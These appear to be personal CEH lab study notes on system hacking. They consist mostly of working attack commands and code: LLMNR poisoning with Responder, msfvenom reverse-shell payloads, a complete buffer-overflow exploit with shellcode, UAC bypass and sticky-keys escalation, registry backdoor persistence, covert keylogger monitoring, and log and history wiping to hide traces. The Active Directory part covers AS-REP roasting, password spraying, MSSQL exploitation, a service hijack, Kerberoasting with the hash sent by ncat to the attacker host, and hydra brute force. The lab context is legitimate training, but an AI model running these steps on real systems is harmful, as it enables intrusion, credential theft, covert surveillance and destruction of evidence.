# System Hacking

exploiting for gaining access to the systems to steal or misuse the data/information

## gaining access, LLMNR NBTNS poisoining

tool used
#### [[Responder]]
#tool/linux 

```bash
sudo responder -I eth0
```
> -I = specifies the interface
> > here eth0 

-> someone has to access the smb service or shared drive in window to capture NTLM hash 
- In windows
```powershell
 \\IP\CEH-Tools
```
 
> by default, responder stores the logs in /usr/share/responder/logs

→ copy the hash of the user and save it in a .txt file
> then we will use [[john]] to crack the hash
```bash
john hash.txt
```
> can be any file name in which the has is been stored


## reverse shell generator

#docker  #gui #tool/linux 

```bash
docker run -d -p 80:80 reverse_shell_generator
```

> if an error pops us `service apache2 stop` → rerun above command

→ firefox → http://localhost
→ IP field → <target-IP'>
→ port 4444
→ create the command in `msfvenom`
→ in the listener tab change the type to `msfconsole`
→ copy both commands and run in separate terminals
→ an .exe file will be created
→ now we need to transfer this .exe file to the target computer
```
	click on places on the file explorer of parrot and click on network and click on edit icon to enter below 
	smb:\\10.10.1.11
	place it in a folder
```
→ as soon as the .exe file runs in the target pc, we will gain access to the computer

we can do the same with other scripts.
next we are using a PowerShell script

→ `Hoaxshell` tab in the reverse shell generator tab
→ select `PowerShell IEX`
→ in this we change the port to `444`
→ copy the payload and save it in a .ps1 file - *this is our payload that we need to run on the target machine*
→ change the listener type to `hoaxshell`

→ in the target pc use PowerShell as admin to run the .ps1 file
``` powershell
	.\shell.ps1
```

## Buffer Overflow (tbc)
---
tools used
#### Immunity Debugger
---
The process needs to be running on the target machine. We need to run the Immunity  debugger as *Admin* on that machine and attach the running process and check it was running on the debugger.

	We can connect with the running process on the target machine using nc on the host machine. Get the commands allowed to be executed on the running process.

	Step1: Spiking
		 It is used to test whether the running process is vulnerable or not. Here 
		
		stats.spk:
		s_readline();
		s_string(“STATS “);
		s_string_variable("0");

		generic_send_tcp 10.10.2.11 44 stats.spk 0 0
		
	Step2: Fuzzing:
		To find the exact bytes where it was breaking

		#!/usr/bin/python3
		import sys, socket
		from time import sleep

		buff = b"A" * 100

		while True:
    		try:
		        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		        soc.connect(('10.10.1.11', 9999))
		        pyload = b'TRUN /.:/' + buff
		        soc.send(pyload)
		        soc.close()
		        sleep(1)
		        buff += b"A" * 100
   			except:
        		print("Fuzzing crashed vulnerable server at %s bytes" % str(len(buff)))
        		sys.exit()

	Step3: finding offset:
		
		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l  10500(output from last step, when server crashed)

		We are able to find the ESP has been overloaded with the values that we have sent and Take the EIP value from the immunity debugger after it was crashed. The output from below will give exact bytes that are required to overwrite.
	
	#!/usr/bin/python3
	import sys, socket

	offset=b"ABCDIOIEJOJDFNLDJFSDFOWEIORER" #(from above output)

	try:
	    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    soc.connect(('10.10.1.11', 9999))
	    pyload=b'TRUN /.:/' + offset  
	    soc.send(pyload)
	    soc.close()
	except:
	    print("Error: Unable to establish connection with Server")
	    sys.exit()

	
		/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10500 -q 396F4338

	Step4: Confirming the Overwrite:

		#!/usr/bin/python3
		import sys, socket
		
		shellcode = b"A" * 2003 + b"B" * 4
		 
		try: 
		    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    soc.connect(('10.10.1.11', 9999))
		    pyload = b'TRUN /.:/' + shellcode
		    soc.send(pyload)
		    soc.close()
		except:
		    print("Error: Unable to establish connection with Server")
		    sys.exit()

	
	Step 5: Badchars checks

		#!/usr/bin/python3
	import sys, socket
	
	badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
	b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
	b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
	b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
	b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
	b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
	b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
	
	shellcode = b"C" * 2003 + b"D" * 4 + badchars
	
	try:
	    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    soc.connect(('10.10.1.11', 9999))
	    pyload = b'TRUN /.:/' + shellcode
	    soc.send(pyload)
	    soc.close()
	except:
	    print("Error: Unable to establish connection with Server")
	    sys.exit()

->In Immunity Debugger, click on the ESP register value in the top-right window. Right-click on the selected ESP register value and click the Follow in Dump option.In the left-corner window, you can observe that there are no badchars that cause problems in the shellcode, as shown in the screenshot.

	Step 6: Finding the right module
	
		Download mona.py and place it in the Immunity debugger installed folders -> pycommands

		In Immunity debugger -> in the search box below -> !mona modules
		Find the module with no memory protection from the table with value set as False for all


	Step 7: Find  return address of the vulnerable module
	
		JMS ESP  == ffe4
	
		!mona find -s “\xff\xe4” -m essfunc.dll

		Note down the return address
		-Re-launch both Immunity Debugger and the vulnerable server as an administrator. Now, Attach the vulnserver process to Immunity Debugger.
		-The Enter expression to follow pop-up appears; enter the identified return address in the text box (here, 625011af) and click OK.
		-You will be pointed to 625011af ESP; press F2 to set up a breakpoint at the selected address, as shown in the screenshot.
		-Now, click on the Run program in the toolbar to run Immunity Debugger.


	Step 8: Find If we can able to overwrite the EIP with return address and control the EIP register

		#!/usr/bin/python3
		import sys, socket
		
		shellcode = b"C" * 2003 + b"\xaf\x11\x50\x62"
		 
		try:
		    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    soc.connect(('10.10.1.11', 9999))
		    pyload = b'TRUN /.:/' + shellcode
		    soc.send(pyload)
		    soc.close()
		except:
		    print("Error: Unable to establish connection with Server")
		    sys.exit()

	Step 9: Exploiting bufferover
	
		msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> EXITFUNC=thread -b "\x00\x0a\x0d" -f c -a x86

		Listen on your localhost:
			nc -lvnp 4444

		BufferOverflow exploit:
		
			#!/usr/bin/python3
			import sys, socket
			
			overflow = (b"\xbf\x45\xa8\x48\x95\xda\xca\xd9\x74\x24\xf4\x5a\x2b\xc9"
			b"\xb1\x52\x31\x7a\x12\x03\x7a\x12\x83\xaf\x54\xaa\x60\xd3"
			b"\x4d\xa9\x8b\x2b\x8e\xce\x02\xce\xbf\xce\x71\x9b\x90\xfe"
			b"\xf2\xc9\x1c\x74\x56\xf9\x97\xf8\x7f\x0e\x1f\xb6\x59\x21"
			b"\xa0\xeb\x9a\x20\x22\xf6\xce\x82\x1b\x39\x03\xc3\x5c\x24"
			b"\xee\x91\x35\x22\x5d\x05\x31\x7e\x5e\xae\x09\x6e\xe6\x53"
			b"\xd9\x91\xc7\xc2\x51\xc8\xc7\xe5\xb6\x60\x4e\xfd\xdb\x4d"
			b"\x18\x76\x2f\x39\x9b\x5e\x61\xc2\x30\x9f\x4d\x31\x48\xd8"
			b"\x6a\xaa\x3f\x10\x89\x57\x38\xe7\xf3\x83\xcd\xf3\x54\x47"
			b"\x75\xdf\x65\x84\xe0\x94\x6a\x61\x66\xf2\x6e\x74\xab\x89"
			b"\x8b\xfd\x4a\x5d\x1a\x45\x69\x79\x46\x1d\x10\xd8\x22\xf0"
			b"\x2d\x3a\x8d\xad\x8b\x31\x20\xb9\xa1\x18\x2d\x0e\x88\xa2"
			b"\xad\x18\x9b\xd1\x9f\x87\x37\x7d\xac\x40\x9e\x7a\xd3\x7a"
			b"\x66\x14\x2a\x85\x97\x3d\xe9\xd1\xc7\x55\xd8\x59\x8c\xa5"
			b"\xe5\x8f\x03\xf5\x49\x60\xe4\xa5\x29\xd0\x8c\xaf\xa5\x0f"
			b"\xac\xd0\x6f\x38\x47\x2b\xf8\x4d\x92\x32\xf3\x39\xa0\x34"
			b"\x12\xe6\x2d\xd2\x7e\x06\x78\x4d\x17\xbf\x21\x05\x86\x40"
			b"\xfc\x60\x88\xcb\xf3\x95\x47\x3c\x79\x85\x30\xcc\x34\xf7"
			b"\x97\xd3\xe2\x9f\x74\x41\x69\x5f\xf2\x7a\x26\x08\x53\x4c"
			b"\x3f\xdc\x49\xf7\xe9\xc2\x93\x61\xd1\x46\x48\x52\xdc\x47"
			b"\x1d\xee\xfa\x57\xdb\xef\x46\x03\xb3\xb9\x10\xfd\x75\x10"
			b"\xd3\x57\x2c\xcf\xbd\x3f\xa9\x23\x7e\x39\xb6\x69\x08\xa5"
			b"\x07\xc4\x4d\xda\xa8\x80\x59\xa3\xd4\x30\xa5\x7e\x5d\x50"
			b"\x44\xaa\xa8\xf9\xd1\x3f\x11\x64\xe2\xea\x56\x91\x61\x1e"
			b"\x27\x66\x79\x6b\x22\x22\x3d\x80\x5e\x3b\xa8\xa6\xcd\x3c"
			b"\xf9")
			
			shellcode = b"C" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow
			 
			try:
			    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			    soc.connect(('10.10.1.11', 9999))
			    pyload =b'TRUN /.:/' + shellcode
			    soc.send(pyload)
			    soc.close()
			except:
			    print("Error: Unable to establish connection with Server")
			    sys.exit()



## Privilege Escalation

2 types
1. horizontal 
2. vertical

tool used 
#### [[Metasploit]]

### By bypassing UAC and Exploiting Sticky Keys

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
```
> here
> > lport (local-port)=444 (change accordingly)
> > lhost (local-host)=10.10.1.13 (change accordingly)
> this creates a reverse shell .exe file payload

```bash
msfconsole
```
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set lhost <10.10.1.13>
```
> change accordingly
```
set lport 444
```
> change accordingly
```
run
```

→ the .exe file when runs on the target machine
→ we get the shell on our terminal
→ perform `sysinfo` and `getuid` - to obtain computer name, OS, domains and current user ID

- background
- search bypassuac
- use exploit/windows/local/bypassuac_fodhelper
- set session 1
- show options
- set LHOST 10.10.1.3
- set TARGET 0
> 0 indicates nothing, but the Exploit Target ID

- exploit
- getsystem -t 1
- getuid
- background
- use post /windows/manage/sticky_keys
- sessions -i*
> lists the sessions in meterpreter

set session 2
exploit

→ login as a non admin account
→ lock the screen
→ press the `shift` button 5 times
→ instead of sticky kets popup, you'll get a cmd prompt
→ whoami
> privilege escalated


### Maintaining remote access

#### spyrix or Refog
#tool/windows  #website 

covert monitoring of user activities in real-time
> can be used to user system monitoring and surveillance

→ install the spyrix on the target machine
→ open the account listed during the setup on a website in the local computer
→ from here u can maintain and monitor your target system
> u can view 
> > 1. live view of the target system
> > 2. keyboard strokes casptured
> > 3. screen shots of the machine taken by spyrix
> > 4. web pages visited by the target
> 
> u can also generate reports directly from the website by clicking `Reports` on the left pane in the dashboard

### persistence by **Modifying Registry Keys**

tool used
#### [[Metasploit]]

```bash
msfconsole -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/test.exe
```
> this is to create a reverse shell .exe payload

```bash
msfconsole -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe
```
> this will create a payload that we'll upload into the run registry  of windows machine

> Below commands is to host the file to download on the target machine

```bash
		mkdir /var/www/html/share
		chmod -R 755 /var/www/html/share
		chown -R www-data:www-data /var/www/html/share
		cp *.exe /var/www/html/share
		service apache2 start

```
```bash
msfconsole
```
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set lhost <10.10.1.13>
```
> change accordingly
```
set lport 444
```
> change accordingly
```
run
```

→ run the test.exe file on target windows machine

- getuid
- background
> in this we will bypass UAC via SilentCleanup task present in the Windows task Scheduler
> present in the metasploit as `bypassuac_silentcleanup`

```
use exploit/windows/local/bypassuac_silentcleanup
```

- set session 1
- show options
- set LHOST 10.10.1.13
- set TARGET 0
> 0 indicates nothing, but the Exploit Target ID

exploit
> if an error occurs saying `Exploit completed, but no sessoin was created` 
> type `exploit` again

getsystem -t 1
getuid
> the meterpreter session is now running with system privileges

→ now we add the registry.exe to the registry to maintain persistent control over the target

```
shell
```
> this will give us a shell on the target machine
> 

in the elevated shell type :
```
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
```
> once the command is successful
> we need to open a metasploit listener in another tab

```bash
msfconsole
```
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set lhost <10.10.1.13>
```
> change accordingly
```
set lport 4444
```
> change accordingly
```
run
```

→ on windows - restart the machine to place the file in the `Run Registry`
> as soon as the admin logins again with the acc
> we will get the shell on the metasploit listener
> a meterpreter session will be opened

> ```
> getuid
> ```
> results may show that the reverse shell is open with admin privileges


## clearing logs

techniques to clear the evidence of security compromise ⇒
1. disable auditing 
2. clearing logs
3. manipulating logs
4. covering tracks on the network
5. covering tracks on the OS
6. deleting files
7. disabling windows functionality

### clearing windows machine logs

#### Clear_Event_Viewer_Logs.bat --> this uses wevtutil, we need to run this as an admin
#tool/windows 

> it is a utility that can be used to wipe out the logs of target system.
> run through PowerShell

#### [[wevtutil]]
#tool/windows 

> wevtutil is a command-line utility used to retrieve information about event logs and publishers. 
> 
> You can also use this command to 
> > 1. install and uninstall event manifests
> > 2. run queries
> > 3. export, archive, and clear logs.

→ open `cmd` with admin privileges
```
wevtutil el
```
> el OR enum-logs = lists event logs

```
wevtutil cl <log-name>
```
> cl OR clear-log = clears a log\
> log name can be obtained from previous command
> > eg. - application, security, system etc.

#### [[cipher]]
#tool/windows 

> Cipher.exe is an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery. 
> This command also assists in encrypting and decrypting data in NTFS partitions.
> To avoid data recovery and to cover their tracks, attackers use the Cipher.exe tool to overwrite the deleted files.


```
cipher /w:<drive or folder or file location>
```
> more the size , more the time taken to overwrite

### clearing logs in linux / BASH 

```bash
export HISTSIZE=0
```

> to clear stored history
> ```bash
> history -c
> ```

> to clear the history of the current shell only, leaving other shells untouched
> ```bash
> history -w
> ```

> to shred the history file making it impossible to read

```bash
shred ~/.bash_history
```

or use all the above commands in a single command

```bash
shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit
```
> This command first shreds the history file, then deletes it, and finally clears the evidence of using this command. After this command, you will exit from the terminal window.


## AD attacks using various tools

### scan to identify the DC IP 
DC IP = Domain Controller IP

tool used
#### [[nmap]]

```bash
nmap 10.10.1.0/24
```
> scans the entire network 

> observe the output correctly and look for an IP that has 2 main ports open
> > port 88 / kerberos-sec
> > port 389 / LDAP 
> 
> **the one with both of these open shows that host is the DC**

now scan that host specially
```bash
nmap -sC -A -sV <DC-IP>
```
> this will provide us with the domain name of the system
> > generally located beneath `smb-os-discovery`

### AS-REP Roasting Attack

> Finding accounts with no kerberos preauth required and will request the TGT from DC, TGT will be encrypted by users password hash and will crack the hash to get users password.

```bash
cd impacket/examples
```

```bash
python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22
```
> GetNPUsers.py = script name
> CEH.com = domain name aqcuired in the previous step
> -no-pass = flag to find user accounts not requiring pre-authentication
> -usersfile = /path/to/file with username list
> -dc-ip = ip address of the DC

copy the hash of the user that has **DONT_REQUIRE_PREAUTH**

save it in a file hash.txt

now we crack the hash using [[john]]

```bash
john --wordlist=/root/ADtools/rockyou.txt hash.txt
```
> --wordlist = define the /path/to/filename where the wordlist is stored

### Password Spraying
> From the Nmap results we can observe that other hosts in the subnet are running services such as RDP, SSH, and FTP. Therefore, we can perform password spraying on each service individually to check for correct credentials If the cracked password for one account is “cupcake”, we try to find any users on the AD network that use the same password with RDP enabled.

#### CrackMapExec

```bash
cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
```
> -u = /path/to/file - username wordlist
> -p = password to be sprayed
> rdp = protocol to be targetted

from the list is someone uses the same password itll be cracked and the ip address od the user will be shown
try connecting to the ip address of the machine that uses the same password with RDP
→ open `remmina`
→ fill out the details extracted
→ try to connect to the client

### Post-Enumeration 

#### PowerView

> it is a PowerShell tool designed for network and AD enumeration

→ transfer the PowerView.ps1 file to the target computer
→ to achieve this we can
> host a server and download it on the target computer

here we are hosting a simple [[portable python server]]
```bash
cd /root/ADtools/
python3 -m http.server 80
```
> u can specify the port at the end
> defaults to 8000

In RDP, download the PowerView.ps1 script and run the powershell

go to any browser on the target machine (connected via rdp here during the previous phase)
```
http://10.10.1.13:80
```

→ download the file 
→ open PowerShell 
```
cd Downloads
```
```
PowerShell -EP bypass
```
```
. .\PowerView.ps1
```
> this loads the powerview script in the PowerShell

not we get much more commands to enumerate further

- Get-NetComputer - displays all the information related to computers in AD
- Get-NetGroup - lists all groups in AD
- Get-NetUser - retrieves detailed info about the AD users such as
	- usernames
	- groups
	- memberships

> in the lab we see a user named *SQL_srv* who has some higher privileges
> so we will be attacking this further

more such commands to enumerate are
- Get-NetOU - lists the organizational units 
- Get-NetSession - lists active sessions 
- Get-NetLoggedon - lists user currently logged on
- Get-NetProcess - lists processes running on domain machines
- Get-NetDomainTrust - domain trusts relationships
- Get-NetServices - services running on domain machines
- Get-NetObjectACL - retrieves ACLs for a specified object
- Get-NetSPN - service principal names (SPN) in the domain
- Find-InterestingDomainACL - finds Interesting ACLs 
- Invoke-ShareFinder - find shared folders in the domain
- Invoke-Sharehunter - find where domain admins are logged in
- Invoke-CheckLocalAdminAccess - checks if the current suer has local admin access on specifed machines


### Perform MSSQL attack

> in the previous lab we saw that a user named **SQL_srv** had admin rights and was running sql services
> also the device was located in IP - 10.10.1.30
> has port 1433 open (mssql services)

so we attempt to bruteforce the password 

tool used
#### [[CEH-Tools/hydra]]
#tool/linux 

→ save the name SQL_srv in a .txt file names user.txt
```bash
echo SQL_srv > user.txt
hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
```
> -L = specifies the username list
> -P = specifies the passwords list
> mssql is the service we are attempting to bruteforce
> > here the results show that the password is batman

we try to log into the service
```bash
python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433 
```

> note down the name of the database
> > here `master`

> we will attempt to find out if the [[xp_cmdshell]] is misconfigured or not

execute into the shell obtained from python script
```
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
```
> if this returns 1, it indicates that the xp_cmdshell is enabled on the server

we will now attempt to exploit this xp_cmshell

```bash
msfconsole
```
- use exploit/windows/mssql/mssql_payload
- set RHOST 10.10.1.30
- set USERNAME SQL-srv
- set PASSWORD batman
- set DATABASE master
- exploit

→ after doing all this we get a meterpreter session
```
shell
```
```
whoami
```

### privilege escalation 
#### WinPeas.exe

→ continue in the above shell
> we need to transfer the WinPeas.exe to the targeted machine

```
cd C:\Users\Public\Downloads
```
```
powershell
```

→ host a [[portable python server]] in the `/root/ADtools` directory

in the compromised shell
```
wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe
```
```
./winpeas.exe
```

→ look for an unquoted service
> here we see that a `file.exe` in `C:\Program Files\CEH services` has unquoted and can be exploited

→ in a new terminal
```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe
```

back in the compromised shell
```
cd ../../.. ; cd "Program Files/CEH services"
```
```
move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe
```

in another terminal we will open a netcat listener
```bash
nc -nlvp 8888
```
> port number same as when creating the payload via msfvenom

→ now as soon as the victim *SQL_srv* logs on the computer
→ we will gain its shell

```
whoami
```
> and we can see that we are logged in as the user *SQL_srv*

### Perform Kerberoasting

> Rubeus is a tool for exploiting Kerberos weaknesses in Windows environments. Kerberoasting is a method to extract ticket granting ticket (TGT) hashes from AD. Attackers target service accounts with associated Kerberos service principal names (SPNs). TGTs are requested from the DC for these accounts, then cracked offline to reveal user passwords. Kerberoasting exploits weak service account passwords and the nature of Kerberos authentication.

in the netcat shell obtained in the last attack

```
powershell
```
```
cd ../.. ; cd Users\Public\Downloads
```
 we need to download 2 more executables
```
wget http://10.10.1.13:8000/Rubeus.exe -o rebeus.exe
```
```
wget http://10.10.1.13:8000/ncat.exe -o ncat.exe
```

```
exit
```
```
cd ../.. ; cd Users\Public\Downloads
```

```
rubeus.exe kerberoast /outfile:hash.txt
```
> after kerberoasting the hash of the DC Admin will be saved in hash.txt

now we need to move this hash.txt file to the attacker machine

in another terminal
```
nc -lvp 9999 > hash.txt
```

in the compromised shell
```
ncat.exe -w 3 10.10.1.13 9999 < hash.txt
```

→ in the netcat listener shell press `Enter`
> this will save the hash in the file

now we will crack the hash using [[hashcat]]

```bash
hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt
```

 > -m 13100: This specifies the hash type. 13100 corresponds to Kerberos 5 AS-REQ Pre-Auth etype 23 (RC4-HMAC), a specific format for Kerberos hashes.
 > --force: This option forces Hashcat to ignore warnings and run even if there are compatibility issues. *Use this with caution, as it might cause instability or incorrect results.*
 > -a 0: This specifies the attack mode. 0 stands for a straight attack, which is a simple dictionary attack where Hashcat tries each password in the dictionary as it is.
 > hash.txt: is the input file containing the hashes to crack
 > /root/ADtools/rockyou.txt: is the wordlist file used for the attack
 
→ we crack the password and then as a DC-admin has high privileges we can use this to attack further if we want


to perform SSH-bruteforce using [[Hydra]]
```bash
hydra -L <path/to/username-list> -P <path/to/password-list> ssh://<target-ip> 
```


---
